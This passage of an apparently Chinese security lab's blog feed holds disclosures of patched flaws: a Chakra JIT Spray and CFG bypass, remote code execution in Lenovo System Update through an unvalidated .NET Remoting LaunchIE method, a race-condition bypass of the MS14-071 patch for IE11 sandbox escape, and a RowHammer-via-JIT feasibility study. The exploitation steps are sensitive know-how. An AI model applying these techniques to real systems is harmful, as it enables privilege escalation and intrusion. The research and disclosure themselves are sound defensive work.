class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000f</span> <span class="number">68e0</span>c72c07      push    <span class="number">72</span>CC7E0h</span><br><span class="line"><span class="number">00950014</span> <span class="number">6844090000</span>      push    <span class="number">944</span>h</span><br></pre></td></tr></table></figure>
<p>了解了Js::ScriptFunction和Js::FunctionBody对象的结构，以及上面所述的这些，就可以准确地找到编译后的JIT代码，和“cfgJumper”。</p>
<h2 id="0x06_随机插入空指令的问题">0x06 随机插入空指令的问题</h2><p>除了立即数加密，Chakra引擎也采用了随机插入空指令的方法来缓解JIT Spray。不过Chakra插入空指令的密度并不高。PoC中使用的由29个16位数组成的JIT Shellcode，在针对Windows 10的利用方式中，会生成29条x86指令，其中几乎不会被插入空指令。但是在针对Windows 8.1及其之前的Chakra引擎的利用方式中，会生成约200条x86指令，就很可能被插入空指令。</p>
<p>解决这个问题的方法是：<br>1、创建一个新的script标签，并将包含JIT ShellCode的JavaScript函数放在里面。<br>2、循环调用该函数触发JIT编译。<br>3、读取编译后的代码，判断JIT ShellCode中间是否被插入了空指令。<br>4、如果被插入了空指令，就销毁script标签，重新创建。循环上述过程。</p>
<p>本文测试环境是安装了2015年5月补丁的Windows 8.1和Windows 10 TP 9926。<br>本文所述问题微软已于2015年9月修复。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>JIT Spray是一种诞生于2010年的漏洞利用技术，可将Shellcode嵌入到JIT引擎生成的可执行代码中。目前，包括Chakra在内的各JIT引擎几乎都针对该技术采取了防御措施，包括随机插入空指令、立即数加密等。本文将指出Chakra的JIT Spray防御措施的两个问题（分别存在于Windows 8.1及其之前的系统，以及Windows 10之中），使得攻击者可在IE中用JIT Spray技术执行Shellcode，从而绕过DEP。同时，本文还给出了一种利用Chakra的JIT引擎绕过CFG的方法。</p>]]>
    
    </summary>
    
      <category term="CFG" scheme="http://xlab.tencent.com/cn/tags/CFG/"/>
    
      <category term="Chakra" scheme="http://xlab.tencent.com/cn/tags/Chakra/"/>
    
      <category term="DEP" scheme="http://xlab.tencent.com/cn/tags/DEP/"/>
    
      <category term="JIT" scheme="http://xlab.tencent.com/cn/tags/JIT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一个PC上的“WormHole”漏洞]]></title>
    <link href="http://xlab.tencent.com/cn/2015/11/05/pc-wormhole/"/>
    <id>http://xlab.tencent.com/cn/2015/11/05/pc-wormhole/</id>
    <published>2015-11-05T08:12:48.000Z</published>
    <updated>2015-12-09T08:19:35.000Z</updated>
    <content type="html"><![CDATA[<p>最近安全界关注的焦点WormHole是一类不安全的开发习惯所导致的，在PC上类似问题也毫不罕见，只不过很多风险被微软默认自带的防火墙缓解了。希望本文和众多关于WormHole的讨论能获多或少地提高一些开发人员的安全意识。</p>
<a id="more"></a>
<p>下面要介绍的问题可导致的后果和WormHole非常类似：影响上亿用户、访问一个端口发送一条指令就可以让目标系统下载一个程序并执行。</p>
<p>该问题已于2015年9月29日被修复。在修复前，存在于所有使用预装Windows系统的ThinkPad、ThinkCentre、ThinkStation以及Lenovo V/B/K/E系列电脑。</p>
<h2 id="0x01_背景">0x01 背景</h2><p>联想ThinkVantage System Update软件用于帮助用户从联想的服务器中直接下载并安装软件、驱动、BIOS的更新，极大的简化了用户更新系统的难度和工作量。其被默认预装在联想的多款产品中。</p>
<p>Lenovo System Update可根据不同的网络环境及配置通过多种方式下载软件及更新，其中一种方式为通过文件共享下载，而UNCServer.exe则是完成此功能的主程序，UNCServer.exe随System Update主程序启动，并建立本地服务端等待主程序连接。在早期版本中，甚至System Update主程序退出后，UNCServer.exe也仍然保持运行状态。</p>
<h2 id="0x02_问题描述">0x02 问题描述</h2><p>在System Update的5.6.0.34版本中，UNCServer.exe通过.NET的Remoting机制，通过TCP服务器提供多种功能。</p>
<p>.NET Remoting发展自DCOM，是一项比较老的.NET分布式处理技术。它序列化服务端的对象和数据并导出，客户端通过HTTP、TCP、IPC信道跨越进程边界实现对服务端对象的引用。然而Remoting的序列化机制会隐式导出对象所有的方法和属性，客户端一旦获得服务端导出的对象引用，即可调用服务端对象提供的所有方法。因此Remoting机制容易引入安全漏洞，且不建议将Remoting服务终端导出给不受信任的客户端。</p>
<p>UNCServer导出的Connector对象提供Connect、DownloadBean、IsFileExist、IsFolderExist、GetFilesInFolder、GetSubFolder、QueryFile、LaunchIE功能。客户端可以连接并获取其引出对象，进行文件下载、应用程序执行等操作。</p>
<p>其中LaunchIE并未对参数进行任何验证，可以用来启动任意进程，其实现代码如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> UNCAction.LaunchIE:</span><br><span class="line">        <span class="keyword">string</span> fileName = (<span class="keyword">string</span>) eventObj;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Process.Start(fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.connector.Current = (<span class="keyword">object</span>) <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>同时，虽然System Update在防火墙策略中只添加了UNCServer的出站规则，但由于UNCServer缺少必要的配置，使其绑定在0.0.0.0:20050上。因此在缺乏防火墙保护的情况下，任何机器都可与其建立连接，最终使用其提供的DownloadBean和LaunchIE功能实现远程下载程序并执行。</p>
<p>UNCServer建立服务端信道并导出对象的代码如下：</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IDictionary</span> properties = (<span class="type">IDictionary</span>) <span class="keyword">new</span> <span class="type">Hashtable</span>();</span><br><span class="line">properties[(<span class="class"><span class="keyword">object</span>) "<span class="title">name</span>"] =</span> (<span class="class"><span class="keyword">object</span>) "<span class="title">tvsuuncchannel</span>";</span></span><br><span class="line">properties[(<span class="class"><span class="keyword">object</span>) "<span class="title">priority</span>"] =</span> (<span class="class"><span class="keyword">object</span>) 2;</span></span><br><span class="line">properties[(<span class="class"><span class="keyword">object</span>) "<span class="title">port</span>"] =</span> (<span class="class"><span class="keyword">object</span>) 20050;</span></span><br><span class="line"><span class="keyword">this</span>.channel = <span class="keyword">new</span> <span class="type">TcpServerChannel</span>(properties, (<span class="type">IServerChannelSinkProvider</span>) <span class="keyword">new</span> <span class="type">BinaryServerFormatterSinkProvider</span>());</span><br><span class="line"><span class="type">ChannelServices</span>.<span class="type">RegisterChannel</span>((<span class="type">IChannel</span>) <span class="keyword">this</span>.channel, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">this</span>.status = <span class="keyword">new</span> <span class="class"><span class="keyword">object</span>(</span>);</span><br><span class="line"><span class="keyword">this</span>.connector = <span class="keyword">new</span> <span class="type">Connector</span>();</span><br><span class="line"><span class="type">RemotingServices</span>.<span class="type">Marshal</span>((<span class="type">MarshalByRefObject</span>) <span class="keyword">this</span>.connector, <span class="string">"Connector"</span>);</span><br><span class="line"><span class="keyword">this</span>.connector.<span class="type">UNCEvent</span> += <span class="keyword">new</span> <span class="type">Connector</span>.<span class="type">UNCEventHandler</span>(<span class="keyword">this</span>.connector_UNCEvent);</span><br></pre></td></tr></table></figure>
<h2 id="0x03_修复">0x03 修复</h2><p>联想在2015/9/29日放出的System Update 5.7.0.13修复了包括此问题在内的多个漏洞。其重新实现了LaunchIE、LaunchHelp功能，对其创建进程的参数进行了验证。并加强了服务端的配置，使其绑定在127.0.0.1:20050，阻止了远程请求。修复后的部分代码如下：</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="type">UNCAction</span>.<span class="type">LaunchIE</span>:</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            tring str = (<span class="type">string</span>) eventObj;</span><br><span class="line">            <span class="type">Uri</span> <span class="literal">result</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="type">Uri</span>.<span class="type">TryCreate</span>(str, <span class="type">UriKind</span>.<span class="type">Absolute</span>, <span class="keyword">out</span> <span class="literal">result</span>) &amp;&amp; (<span class="literal">result</span>.<span class="type">Scheme</span> == <span class="type">Uri</span>.<span class="type">UriSchemeHttp</span> || <span class="literal">result</span>.<span class="type">Scheme</span> == <span class="type">Uri</span>.<span class="type">UriSchemeHttps</span>))</span><br><span class="line">                <span class="type">Process</span>.<span class="type">Start</span>(str);</span><br><span class="line">        &#125;</span><br><span class="line">        catch&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        this.connector.<span class="type">Current</span> = (<span class="keyword">object</span>) <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">IDictionary</span> properties = (<span class="type">IDictionary</span>) new <span class="type">Hashtable</span>();</span><br><span class="line">properties[(<span class="keyword">object</span>) <span class="string">"name"</span>] = (<span class="keyword">object</span>) <span class="string">"tvsuuncchannel"</span>;</span><br><span class="line">properties[(<span class="keyword">object</span>) <span class="string">"priority"</span>] = (<span class="keyword">object</span>) <span class="number">2</span>;</span><br><span class="line">properties[(<span class="keyword">object</span>) <span class="string">"port"</span>] = (<span class="keyword">object</span>) <span class="number">20050</span>;</span><br><span class="line">properties[(<span class="keyword">object</span>) <span class="string">"rejectRemoteRequests"</span>] = (<span class="keyword">object</span>) <span class="literal">true</span>;</span><br><span class="line">properties[(<span class="keyword">object</span>) <span class="string">"bindTo"</span>] = (<span class="keyword">object</span>) <span class="string">"127.0.0.1"</span>;</span><br><span class="line">this.channel = new <span class="type">TcpServerChannel</span>(properties, (<span class="type">IServerChannelSinkProvider</span>) new <span class="type">BinaryServerFormatterSinkProvider</span>());</span><br><span class="line"><span class="type">ChannelServices</span>.<span class="type">RegisterChannel</span>((<span class="type">IChannel</span>) this.channel, <span class="literal">false</span>);</span><br><span class="line">this.status = new <span class="keyword">object</span>();</span><br><span class="line">this.connector = new <span class="type">Connector</span>();</span><br><span class="line"><span class="type">RemotingServices</span>.<span class="type">Marshal</span>((<span class="type">MarshalByRefObject</span>) this.connector, <span class="string">"Connector"</span>);</span><br><span class="line">this.connector.<span class="type">UNCEvent</span> += new <span class="type">Connector</span>.<span class="type">UNCEventHandler</span>(this.connector_UNCEvent);</span><br></pre></td></tr></table></figure>
<h2 id="0x04_小结">0x04 小结</h2><p>Remoting作为上一代的.NET分布式处理技术，由于设计时的安全缺陷早已被微软的WCF技术取代。如果应用程序仍在使用Remoting技术进行分布式处理或通信，应意识到其潜在的安全问题，稍有不当则可能引入安全漏洞。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近安全界关注的焦点WormHole是一类不安全的开发习惯所导致的，在PC上类似问题也毫不罕见，只不过很多风险被微软默认自带的防火墙缓解了。希望本文和众多关于WormHole的讨论能获多或少地提高一些开发人员的安全意识。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[在补丁上戳个洞——利用已经被修复的漏洞实现IE沙箱逃逸]]></title>
    <link href="http://xlab.tencent.com/cn/2015/08/27/Poking-a-Hole-in-the-Patch/"/>
    <id>http://xlab.tencent.com/cn/2015/08/27/Poking-a-Hole-in-the-Patch/</id>
    <published>2015-08-27T11:17:24.000Z</published>
    <updated>2015-11-30T05:45:35.000Z</updated>
    <content type="html"><![CDATA[<p>James Forshaw在2014年11月曾向微软报告过一个Windows Audio Service的本地权限提升漏洞。我们通过分析发现，微软提供的补丁并没有完全解决问题。通过一些技巧的组合，我们可以绕过补丁，继续利用该漏洞。<br><a id="more"></a></p>
<h2 id="0x00_The_Problem">0x00 The Problem</h2><p>James Forshaw在2014年11月曾向微软报告过一个Windows Audio Service的本地权限提升漏洞。<br>Windows Audio Service负责管理系统中所有进程的音频会话。这个服务会把会话参数存储到HKCU\Software\Microsoft\Internet Explorer\LowRegistry\Audio\PolicyConfig。</p>
<p>为了使低权限进程也可修改音频会话的参数，服务在存储时会递归设置所有子键的ACL为Low IL可控。<br>若在这个注册表键下设置一个符号链接指向高权限注册表键，就可能导致高权限注册表键变为Low IL可控。</p>
<h2 id="0x01_The_Patch">0x01 The Patch</h2><p>微软发布了安全公告MS14-071，并发布了KB3005607补丁修复这个漏洞。<br>这个补丁增加了两个函数，SafeRegCreateKeyEx和DetectRegistryLink。</p>
<p>DetectRegistryLink大致的代码逻辑如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DetectRegistryLink</span><span class="params">(<span class="keyword">const</span> HKEY key_handle, <span class="keyword">const</span> wchar_t sub_key_path[], HKEY * out_handle)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> detect_result = <span class="number">0</span>;</span><br><span class="line">    HKEY sub_key_handle;</span><br><span class="line">    LSTATUS status = RegOpenKeyExW(key_handle,</span><br><span class="line">                                   sub_key_path,</span><br><span class="line">                                   REG_OPTION_OPEN_LINK,</span><br><span class="line">                                   KEY_ALL_ACCESS,</span><br><span class="line">                                   &amp;sub_key_handle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (status == ERROR_FILE_NOT_FOUND) &#123;</span><br><span class="line">            detect_result = <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == ERROR_ACCESS_DENIED) &#123;</span><br><span class="line">            detect_result = <span class="number">4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            detect_result = <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DWORD key_type;</span><br><span class="line">        BYTE data[MAX_PATH * <span class="number">2</span>];</span><br><span class="line">        DWORD data_size = <span class="keyword">sizeof</span>(data);</span><br><span class="line"></span><br><span class="line">        status = RegQueryValueExW(sub_key_handle, </span><br><span class="line">                                  kSymbolicLinkValueName, </span><br><span class="line">                                  <span class="literal">nullptr</span>,</span><br><span class="line">                                  &amp;key_type, </span><br><span class="line">                                  data, </span><br><span class="line">                                  &amp;data_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((status == ERROR_SUCCESS) || (status == ERROR_MORE_DATA)) &amp;&amp; (key_type == REG_LINK)) &#123;</span><br><span class="line">            detect_result = <span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ((status == ERROR_FILE_NOT_FOUND) &amp;&amp; (detect_result != <span class="number">1</span>)) &#123;</span><br><span class="line">            HKEY temp_key_handle;</span><br><span class="line">            status = RegOpenKeyExW(key_handle,</span><br><span class="line">                                   sub_key_path,</span><br><span class="line">                                   <span class="number">0</span>,</span><br><span class="line">                                   KEY_READ,</span><br><span class="line">                                   &amp;temp_key_handle);</span><br><span class="line"></span><br><span class="line">            RegCloseKey(temp_key_handle);</span><br><span class="line">            detect_result = (status == ERROR_SUCCESS) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *out_handle = sub_key_handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> detect_result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DetectRegistryLink对于注册表符号链接做了比较严格的判断。这个函数使用REG_OPTION_OPEN_LINK打开注册表键之后处理了多种情况，包括重定向到不存在的键值等。最终打开的注册表键句柄被传出函数复用。</p>
<p>外层的SafeRegCreateKeyEx在创建注册表键之前调用了这个函数进行检查，发现有注册表符号链接则使用NtDeleteKey进行删除，最后统一使用RegCreateKeyEx创建一个新的注册表键。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">HKEY sub_key_handle;</span><br><span class="line"><span class="keyword">int</span> detect_result = DetectRegistryLink(key_handle, kSubKeyPath, &amp;sub_key_handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detect_result == <span class="number">1</span>) &#123;</span><br><span class="line">    status = NtDeleteKey(sub_key_handle);</span><br><span class="line">    RegCloseKey(sub_key_handle);</span><br><span class="line">    sub_key_handle = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (detect_result &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sub_key_handle) &#123;</span><br><span class="line">        RegCloseKey(sub_key_handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ERROR_ACCESS_DENIED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD create_disposition = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sub_key_handle) &#123;</span><br><span class="line">    create_disposition = REG_OPENED_EXISTING_KEY;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    status = RegCreateKeyExW(key_handle,</span><br><span class="line">                             kSubKeyPath,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="literal">nullptr</span>,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             KEY_ALL_ACCESS,</span><br><span class="line">                             <span class="literal">nullptr</span>,</span><br><span class="line">                             &amp;sub_key_handle,</span><br><span class="line">                             &amp;create_disposition);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (create_disposition != REG_CREATED_NEW_KEY) &#123;</span><br><span class="line">        RegCloseKey(sub_key_handle);</span><br><span class="line">        <span class="keyword">return</span> ERROR_ACCESS_DENIED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x02_The_Flaw">0x02 The Flaw</h2><p>逻辑看似很严密，然而存在一个比较严重的问题。</p>
<p>在使用NtDeleteKey删除目标注册表键之后，系统不再允许对它进行操作。虽然已打开的句柄继续有效，但任何操作都会返回STATUS_KEY_DELETED，只能关闭句柄。</p>
<p>在句柄关闭后，后续操作就只能使用对象名打开一个新的句柄。在这种情况下，系统并不保证和之前同名的对象就是同一个对象。</p>
<p>通过精确的时间差攻击，我们可以抢在RegCreateKeyEx被调用之前创建一个符号链接，从而绕过判断。</p>
<h2 id="0x03_The_Exploit">0x03 The Exploit</h2><p>我们仍然以IE 11沙箱为例，说明如何利用此漏洞提升权限。</p>
<p>为了满足利用条件，首先需要让Windows Audio Service做出删除动作。<br>我们可以故意在HKCU\Software\Microsoft\Internet Explorer\LowRegistry\Audio\PolicyConfig注册表键下创建一个符号链接，并触发Windows Audio Service写入，这样就会走入删除逻辑。</p>
<p>如何精确控制写入符号链接的时间很重要。我们当然可以开十万个线程循环写入，总有一天会成功。但其实系统已经提供了这样的触发机制。</p>
<p>NtNotifyChangeKey可以监视一个注册表键，当我们指定的注册表操作发生时，设置一个事件信号。</p>
<p>通过在符号链接上设置通知，我们可以在符号链接被Windows Audio Service删除时立刻触发，并有机会抢在Windows Audio Service创建新的注册表键之前创建一个符号链接。</p>
<p>将符号链接指向HKCU\Software\Microsoft\Internet Explorer\Low Rights\ElevationPolicy注册表键下的一个尚不存在的GUID，就可以满足REG_CREATED_NEW_KEY的判断，成功创建目标注册表键。</p>
<p>之后Windows Audio Service会使用上层注册表键（PolicyConfig）的安全性设置（Low IL可控）覆盖目标注册表键的安全性设置，导致刚创建的ElevationPolicy键值可被IE沙箱内进程写入。</p>
<p>这时写入任意的AppPath，并将Policy设置为0x3，即可在IE沙箱内以Medium IL启动任意进程。</p>
<h2 id="0x04_The_Trick">0x04 The Trick</h2><p>Windows Audio Service的注册表操作是在RpcImpersonateClient之后进行的。所以在IE沙箱中直接操作虽然可以竞争成功，但注册表操作会使用源进程的Low IL令牌，权限不足。</p>
<p>James Forshaw在原版的PoC中未能解决这个问题，只能在外部手动启动SndVol.exe触发。</p>
<p>为了解决这个问题，我们需要触发一个Medium IL以上的进程使用音频会话，通常只需要进程发出声音即可。</p>
<p>IE Elevation Policy中默认设置了一些进程可以在沙箱内用Medium IL启动，其中就包括记事本（Notepad.exe）。Medium IL进程启动后我们只有结束进程的权限，但在启动进程时我们可以传递命令行参数。</p>
<p>记事本在打开不存在的文件时会弹出一个系统对话框询问是否需要创建新文件，伴随一声系统默认声音。这就足够触发Windows Audio Service写入注册表键了。</p>
<p>通过反复启动尝试，我们就能多次竞争，保证最终成功。</p>
<h2 id="0x05_The_Mitigation">0x05 The Mitigation</h2><p>微软最终在2015年8月的补丁中彻底禁止了Low IL进程创建注册表符号链接。在设置注册表符号链接时，内核通过RtlIsSandboxedToken函数判断当前进程令牌是Low IL或AppContainer则直接返回拒绝访问。这导致任何基于注册表符号链接的攻击在Low IL都无法使用了，因此在IE沙箱内直接利用这个漏洞的可能性被彻底封堵了。</p>
<h2 id="References">References</h2><ol>
<li>Issue 99: IE11 AudioSrv RegistryKey EPM Privilege Escalation - James Forshaw<br><a href="https://code.google.com/p/google-security-research/issues/detail?id=99" target="_blank" rel="external">https://code.google.com/p/google-security-research/issues/detail?id=99</a></li>
<li>Vulnerability in Windows Audio Service Could Allow Elevation of Privilege (3005607)<br><a href="https://technet.microsoft.com/library/security/MS14-071" target="_blank" rel="external">https://technet.microsoft.com/library/security/MS14-071</a></li>
<li>Windows 10 Symbolic Link Mitigations - James Forshaw<br><a href="https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html" target="_blank" rel="external">https://googleprojectzero.blogspot.com/2015/08/windows-10hh-symbolic-link-mitigations.html</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>James Forshaw在2014年11月曾向微软报告过一个Windows Audio Service的本地权限提升漏洞。我们通过分析发现，微软提供的补丁并没有完全解决问题。通过一些技巧的组合，我们可以绕过补丁，继续利用该漏洞。<br>]]>
    
    </summary>
    
      <category term="沙箱逃逸" scheme="http://xlab.tencent.com/cn/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[JIT引擎触发RowHammer可行性研究]]></title>
    <link href="http://xlab.tencent.com/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/"/>
    <id>http://xlab.tencent.com/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/</id>
    <published>2015-06-09T02:42:07.000Z</published>
    <updated>2015-11-30T05:46:27.000Z</updated>
    <content type="html"><![CDATA[<p>RowHammer漏洞是DDR3内存中存在的问题，通过频繁的访问内存中的一行数据，会导致临近行的数据发生反转。然而由于其运行需要在目标主机上大量运行特定的代码，实施攻击存在很大的难度。本文旨在研究能否通过Javascript等脚本语言的动态执行触发RowHammer，如果能够成功将极大增加RowHammer的攻击性。为了验证该思路，本文分析了Java Hotspot、Chrome V8、.NET CoreCLR以及Firefox SpiderMonkey的实现机制并给出了可行性分析。<br><a id="more"></a></p>
<h1 id="0x00_前言">0x00 前言</h1><p>&emsp;&emsp;2015年3月Google Project Zero发表文章Exploiting the DRAM rowhammer bug to gain kernel privileges。由于文中提到的缺陷比较难以修复，需要更新BIOS来提高内存刷新的速度，引起了人们的担忧。然而由于RowHammer的运行需要在目标主机上运行特定的汇编代码，实施攻击存在很大的难度。<br>&emsp;&emsp;本文旨在研究能否通过Javascript等脚本语言的动态执行触发RowHammer，如果能够成功将极大增加RowHammer的攻击性。为了验证该思路，本文分析了Java Hotspot、Chrome V8、.NET CoreCLR以及Firefox SpiderMonkey的实现机制并给出了可行性分析。<br>&emsp;&emsp;遗憾的是我们在这几个程序中，没有找到最优的利用方式。要么不存在相关的指令，要么指令无法达到RowHammer要求，要么需要有额外的操作更改执行环境才能触发，缺乏实际的攻击意义。</p>
<h1 id="0x01_RowHammer">0x01 RowHammer</h1><p>&emsp;&emsp;本节将简要回顾RowHammer存在的原理，其触发的机制，已经在利用时将面临到的一些挑战。</p>
<h2 id="1-1_What’s_RowHammer?">1.1 What’s RowHammer?</h2><p>&emsp;&emsp;RowHammer是DDR3内存中存在的问题，通过频繁的访问内存中的一行(row)数据，会导致临近行(row)的数据发生位反转。如图1.1(a)所示，内存是由一系列内存单元构成的二维数组。如图1.1(b)所示每一个内存单元由一个晶体管和一个电容组成，晶体管与wordline相连，电容负责存储数据。DRAM的每一行(row)有自己的wordline，wordline需要置高电压，特定行(row)的数据才能够访问。当某一行的wordline置高电压时，该行的数据就会进入row-buffer。当wordline频繁的充放电时，就可能会导致附近row的存储单元中的电容放电，如果在其被刷新之前，损失过多的电压就会导致内存中的数据发生变化。</p>
<p>&emsp;&emsp;图1.2所示是一块内存，其中一个row为64kb(8KB)大小, 32k个row组成一个Bank, 8个Bank组成一个Rank, 该Rank为2G。此处需要注意不同的Bank有专用的row-buffer，访问不同Bank中的row不会导致wordline的充放电。<br>内存中的电压是不能长期保存的，需要不停的对其进行刷新，刷新的速度为64ms，所以必须在64ms内完成RowHammer操作。<br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img1.png" alt="[图1.1]" title="[图1.1]"></p>
<center>图1.1</center><br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img2.png" alt="[图1.2]" title="[图1.2]"><br><center>图1.2</center>                    

<h2 id="1-2_RowHammer触发的方法">1.2 RowHammer触发的方法</h2><p>&emsp;&emsp;表1.1所示为Google Project Zero所给出的可以触发RowHammer的代码段。<br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img3.png" alt="img3.png" title=""><br>&emsp;&emsp;其中x, y地址的选择非常重要，x, y必须要在同一个Bank，不同的row中。因为不同的Bank有专用的row-buffer。如果x, y 在同一个row中就不会对wordline进行频繁的充放电，也就不会触发RowHammer。</p>
<p>&emsp;&emsp;上述代码只是一种有效的测试方法，但并不是惟一的，归根到底我们所需要的就是在64ms内让一个wordline频繁的充放电。</p>
